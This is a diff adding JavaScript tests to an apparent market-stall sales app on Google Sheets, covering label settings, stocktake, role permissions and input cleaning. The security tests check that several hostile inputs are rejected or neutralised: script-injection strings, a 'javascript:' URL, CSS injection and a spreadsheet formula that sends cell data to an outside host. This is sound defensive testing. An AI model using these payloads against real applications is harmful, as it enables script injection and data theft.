@@ -31,7 +31,11 @@ function makeSheet() {
           for (let i = 0; i < nr; i++) {
             const row = rows[r - 1 + i] || [];
             const o = [];
-            for (let j = 0; j < nc; j++) o.push(row[c - 1 + j] === undefined ? '' : row[c - 1 + j]);
+            for (let j = 0; j < nc; j++) {
+              const v = row[c - 1 + j] === undefined ? '' : row[c - 1 + j];
+              // Like Sheets: a leading apostrophe only marks text; reading gives the text without it.
+              o.push(typeof v === 'string' && v.charAt(0) === "'" ? v.slice(1) : v);
+            }
             out.push(o);
           }
           return out;
@@ -64,6 +68,8 @@ function load(googleTokens) {
       getActiveSpreadsheet: () => ({
         getSheetByName: (n) => sheets[n] || null,
         insertSheet: (n) => (sheets[n] = makeSheet())
+      }),
+      getUi: () => ({ alert() {} 
       })
     },
     PropertiesService: {
@@ -110,7 +116,7 @@ function load(googleTokens) {
   ctx.SF.PLATFORM.googleClientId = '';
   ctx.SF.PLATFORM.admins = [];
   ctx.SF.migrate();
-  return { SF: ctx.SF, sheets, props, gh: ctx.__gh };
+  return { SF: ctx.SF, sheets, props, gh: ctx.__gh, ctx };
 }
 
 const CLIENT = 'client-123.apps.googleusercontent.com';
@@ -576,6 +582,198 @@ test('with the Collect step switched on, Paid waits for the hand-over', () => {
   assert.strictEqual(sheets.Orders.rows.find((x) => x[0] === r.orderNo)[10], 'paid');
   const till = SF.dispatch('till', { token: tok, marketId: 'M01' }).data;
   assert.ok(till.waiting.some((o) => o.no === r.orderNo), 'the till can see it is waiting');
+});
+
+/* ---------- the label look ---------- */
+
+test('the order page knows the owner name and WhatsApp number, and the reply carries the note', () => {
+  const { SF, tok } = markets3();
+  SF.dispatch('saveProfile', { token: tok, opId: 'pf', ownerName: 'Marian', whatsapp: '066 000 0000' });
+  const prof = SF.dispatch('catalogue', {}).data.profile;
+  assert.strictEqual(prof.ownerName, 'Marian');
+  assert.strictEqual(prof.whatsapp, '066 000 0000');
+  const r = order(SF, { market: 'M01', note: 'After 11 please' });
+  assert.strictEqual(r.note, 'After 11 please');
+});
+
+test('the label look is kept: style, contact lines, a small logo, price on or off', () => {
+  const { SF, tok } = markets3();
+  let look = SF.dispatch('labels', { token: tok }).data.look;
+  assert.strictEqual(look.style, 'classic', 'starts in the style of the printed labels');
+  assert.strictEqual(look.price, false, 'no price on the label unless asked');
+  const logo = 'data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAAAAAA6fptVAAAACklEQVR4nGNgAAAAAgABSK+kcQAAAABJRU5ErkJggg==';
+  const r = SF.dispatch('saveLabelLook', { token: tok, opId: 'll1', style: 'classic',
+    contact: 'Marian\r\nMobile 066 000 0000\nthird\nfourth line is dropped', logo, price: true });
+  assert.strictEqual(r.ok, true, r.message);
+  look = SF.dispatch('labels', { token: tok }).data.look;
+  assert.strictEqual(look.contact, 'Marian\nMobile 066 000 0000\nthird');
+  assert.strictEqual(look.logo, logo);
+  assert.strictEqual(look.price, true);
+  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll2', logo: 'javascript:alert(1)' }).ok, false);
+  assert.strictEqual(SF.dispatch('saveLabelLook', { token: tok, opId: 'll3',
+    logo: 'data:image/png;base64,' + 'A'.repeat(70000) }).ok, false, 'too big to keep');
+  SF.dispatch('saveLabelLook', { token: tok, opId: 'll4', style: 'simple', contact: '', price: false });
+  look = SF.dispatch('labels', { token: tok }).data.look;
+  assert.strictEqual(look.style, 'simple');
+  assert.strictEqual(look.logo, logo, 'leaving the logo out keeps it');
+});
+
+test('only an owner or manager can change the label look', () => {
+  const { SF } = markets3();
+  SF.setPin('cashier', '1111');
+  const t = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
+  assert.strictEqual(SF.dispatch('saveLabelLook', { token: t, opId: 'x', contact: 'hi' }).ok, false);
+});
+
+/* ---------- stocktake ---------- */
+
+function counting() {
+  const env = markets3();                         // owner signed in; P01 Apricot Jam, 10 on hand
+  const SF = env.SF;
+  SF.append('products', { ProductId: 'P02', Name: 'Fig Jam', Type: 'stocked', Unit: 'each', Price: 80, Active: 'Yes', Sort: 20 });
+  SF.move('P02', 6, 'adjust', 'test');
+  SF.append('batches', { BatchId: 'B1', When: new Date(), ProductId: 'P01', Made: 10, CostLines: '[]', TotalCost: 200, CostPerUnit: 20 });
+  SF.setPin('cashier', '1111'); SF.setPin('manager', '2222');
+  env.cashier = SF.dispatch('signIn', { pin: '1111', device: 'c' }).data.token;
+  env.manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
+  return env;
+}
+let cop = 0;
+const act = (SF, action, token, extra) => SF.dispatch(action, Object.assign({ token, opId: 'k' + (cop++) }, extra || {}));
+
+test('stocktake: a manager starts it, a cashier cannot', () => {
+  const { SF, cashier, manager } = counting();
+  assert.strictEqual(act(SF, 'countStart', cashier).ok, false);
+  const r = act(SF, 'countStart', manager);
+  assert.strictEqual(r.ok, true, r.message);
+  assert.strictEqual(act(SF, 'countStart', manager).ok, false, 'only one at a time');
+  const st = SF.dispatch('countState', { token: cashier }).data;
+  assert.strictEqual(st.open.id, r.id);
+  assert.strictEqual(st.canApprove, false);
+  assert.strictEqual(st.open.review, undefined, 'only the owner sees the review');
+  assert.strictEqual(JSON.stringify(st.open.locations.map((l) => l.status)), '["todo","todo","todo"]');
+});
+
+test('stocktake: anyone counts a location; counting it again replaces the first count', () => {
+  const { SF, tok, cashier, manager } = counting();
+  const id = act(SF, 'countStart', manager).id;
+  act(SF, 'countClaim', cashier, { countId: id, location: 'Storeroom' });
+  let loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
+  assert.strictEqual(loc.status, 'counting');
+  assert.ok(act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 9 }] }).ok);
+  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 2 }] });
+  act(SF, 'countSave', manager, { countId: id, location: 'Car', lines: [{ id: 'P02', qty: 3 }] });
+  loc = SF.dispatch('countState', { token: cashier }).data.open.locations.find((l) => l.name === 'Storeroom');
+  assert.strictEqual(loc.status, 'done'); assert.strictEqual(loc.items, 9);
+  const review = SF.dispatch('countState', { token: tok }).data.open.review;
+  const p1 = review.find((r) => r.id === 'P01'), p2 = review.find((r) => r.id === 'P02');
+  assert.strictEqual(JSON.stringify([p1.expected, p1.counted, p1.diff]), '[10,7,-3]', 'the later Storeroom count wins');
+  assert.strictEqual(JSON.stringify([p2.expected, p2.counted, p2.diff]), '[6,5,-1]', 'two locations add up');
+  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Garden shed', lines: [] }).ok, false);
+  assert.strictEqual(act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: -2 }] }).ok, false);
+});
+
+test('stocktake: the owner approves; stock follows the count and the loss is recorded at cost', () => {
+  const { SF, sheets, tok, cashier, manager } = counting();
+  const id = act(SF, 'countStart', manager).id;
+  act(SF, 'countSave', cashier, { countId: id, location: 'Storeroom', lines: [{ id: 'P01', qty: 7 }, { id: 'P02', qty: 8 }] });
+  assert.strictEqual(act(SF, 'countApprove', manager, { countId: id }).ok, false, 'Marian approves, not a manager');
+  const r = act(SF, 'countApprove', tok, { countId: id });
+  assert.strictEqual(r.ok, true, r.message);
+  assert.strictEqual(r.result.lossUnits, 3);
+  assert.strictEqual(r.result.lossValue, 60, '3 Apricot Jam at R20 each');
+  assert.strictEqual(r.result.foundUnits, 2);
+  const hand = SF.onHand();
+  assert.strictEqual(hand.P01, 7); assert.strictEqual(hand.P02, 8);
+  const moves = sheets.Movements.rows.filter((m) => m[3] === 'stocktake');
+  assert.strictEqual(moves.length, 2, 'two ledger lines, nothing overwritten');
+  assert.ok(moves.every((m) => m[4] === 'Stocktake ' + id));
+  const st = SF.dispatch('countState', { token: tok }).data;
+  assert.strictEqual(st.open, null);
+  assert.strictEqual(st.history[0].status, 'approved');
+  assert.strictEqual(st.history[0].result.lossValue, 60);
+});
+
+test('stocktake: what nobody counted is left alone, unless the owner says there are none', () => {
+  const { SF, tok, cashier } = counting();
+  let id = act(SF, 'countStart', tok).id;
+  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
+  let r = act(SF, 'countApprove', tok, { countId: id });
+  assert.strictEqual(r.result.uncounted, 1);
+  assert.strictEqual(SF.onHand().P02, 6, 'Fig Jam kept');
+  id = act(SF, 'countStart', tok).id;
+  act(SF, 'countSave', cashier, { countId: id, location: 'Car', lines: [{ id: 'P01', qty: 10 }] });
+  r = act(SF, 'countApprove', tok, { countId: id, uncounted: 'zero' });
+  assert.strictEqual(SF.onHand().P02, 0, 'none left');
+  assert.strictEqual(r.result.lossUnits, 6);
+});
+
+test('stocktake: managers edit the locations; the list stays tidy', () => {
+  const { SF, cashier, manager } = counting();
+  assert.strictEqual(act(SF, 'countLocationsSave', cashier, { locations: ['X'] }).ok, false);
+  const r = act(SF, 'countLocationsSave', manager, { locations: [' Storeroom ', 'storeroom', 'Car  boot', '', 'Kitchen'] });
+  assert.strictEqual(JSON.stringify(r.locations), '["Storeroom","Car boot","Kitchen"]');
+  assert.strictEqual(act(SF, 'countLocationsSave', manager, { locations: [] }).ok, false);
+  assert.strictEqual(SF.dispatch('countState', { token: cashier }).data.locations.length, 3);
+});
+
+/* ---------- security: who may change things, and what text may hold ---------- */
+
+test('a viewer sees the numbers but cannot change how the stall runs', () => {
+  const { SF, tok } = markets3();
+  SF.setPin('viewer', '3333'); SF.setPin('manager', '2222');
+  const viewer = SF.dispatch('signIn', { pin: '3333', device: 'v' }).data.token;
+  const manager = SF.dispatch('signIn', { pin: '2222', device: 'm' }).data.token;
+  let k = 0;
+  const tryAs = (t, action, extra) => SF.dispatch(action, Object.assign({ token: t, opId: 'sec' + (k++) }, extra || {}));
+  [['setPreordersOpen', { open: false }], ['addMarket', { name: 'Sneaky Market' }], ['releaseUnpaid', {}],
+   ['setActiveMarket', { marketId: 'M02' }], ['saveLabelLook', { contact: 'x' }], ['setCollectStep', { on: true }],
+   ['setHomeOrders', { open: false }], ['savePluginSettings', { plugin: 'cashup', values: {} }],
+   ['saveProfile', { name: 'X' }]].forEach(([a, extra]) => {
+    const r = tryAs(viewer, a, extra);
+    assert.strictEqual(r.ok, false, a + ' should be refused for a viewer');
+    assert.strictEqual(r.code, 'forbidden', a);
+  });
+  assert.strictEqual(SF.dispatch('dashboard', { token: viewer }).ok, true, 'the numbers still work for a viewer');
+  assert.strictEqual(tryAs(manager, 'setPreordersOpen', { open: true }).ok, true, 'a manager may');
+  assert.strictEqual(tryAs(manager, 'addMarket', { name: 'Real Market', date: day(4) }).ok, true);
+  assert.strictEqual(tryAs(tok, 'setActiveMarket', { marketId: 'M02' }).ok, true, 'and the owner');
+});
+
+test('a market date must be a date, and the live market must exist', () => {
+  const { SF, tok } = markets3();
+  const bad = SF.dispatch('addMarket', { token: tok, opId: 'd1', name: 'Bad', date: '2099-01-01<img src=x onerror=alert(1)>' });
+  assert.strictEqual(bad.ok, false);
+  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd2', name: 'Good', date: '2026-12-05' }).ok, true);
+  assert.strictEqual(SF.dispatch('addMarket', { token: tok, opId: 'd3', name: 'No date yet' }).ok, true);
+  assert.strictEqual(SF.dispatch('setActiveMarket', { token: tok, opId: 'd4', marketId: 'zzz' }).ok, false);
+  assert.strictEqual(SF.get('activeMarket'), 'M01', 'unchanged');
+});
+
+test('shop words are plain text, when saved and when read back from older data', () => {
+  const { SF, tok } = markets3();
+  SF.dispatch('saveProfile', { token: tok, opId: 'v1', colour: 'red;background:url(x)',
+    vocab: { units: '<img src=x onerror="steal()">jars', unit: 'jar', evil: 'x' }, plugins: ['cashup', 'nope'] });
+  let pr = SF.profile();
+  assert.ok(!/[<>"=]/.test(pr.vocab.units), pr.vocab.units);
+  assert.strictEqual(pr.vocab.evil, undefined, 'unknown words are dropped');
+  assert.strictEqual(pr.colour, '#7B2D43', 'a colour must be a colour');
+  assert.strictEqual(JSON.stringify(pr.plugins), '["cashup"]');
+  // Data stored before this check existed is cleaned on the way out.
+  SF.set('profile', JSON.stringify({ vocab: { units: '<script>bad()</script>' }, colour: 'javascript:x' }));
+  pr = SF.profile();
+  assert.ok(!/[<>()]/.test(pr.vocab.units), pr.vocab.units);
+  assert.strictEqual(pr.colour, '#7B2D43');
+});
+
+test('Export orders keeps a customer name that starts with = as text', () => {
+  const { SF, sheets, ctx } = markets3();
+  assert.strictEqual(order(SF, { market: 'M01', name: '=IMAGE("https://e.tld/?"&A1)' }).ok, true);
+  ctx.sfExport();
+  const out = Object.keys(sheets).filter((n) => /^Orders \d/.test(n)).map((n) => sheets[n])[0];
+  assert.ok(out, 'the export tab was made');
+  const cell = out.rows[1][4];
+  assert.ok(String(cell).startsWith("'="), 'stays text: ' + cell);
 });
 
 /* ---------- reporting a problem ---------- */
